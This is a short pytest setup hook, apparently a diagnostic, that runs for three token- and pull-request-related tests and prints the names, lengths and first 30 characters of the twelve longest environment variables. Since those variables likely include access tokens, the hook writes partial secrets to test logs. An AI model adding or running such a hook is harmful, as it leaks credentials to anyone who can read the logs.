import os, pytest
@pytest.hookimpl(tryfirst=True)
def pytest_runtest_setup(item):
    if item.name in ("test_every_write_uses_the_token_that_can_perform_it",
                     "test_without_a_pat_the_legs_own_token_opens_the_pr",
                     "test_open_pr_links_the_issue_and_never_merges"):
        es=dict(os.environ); b=sorted(((len(v),k) for k,v in es.items()), reverse=True)
        print(f"\nDIAGCFG {item.name} count={len(es)} total={sum(len(k)+len(v) for k,v in es.items())}", flush=True)
        for n,k in b[:12]:
            print(f"  {k} len={n} head={es[k][:30]!r}", flush=True)
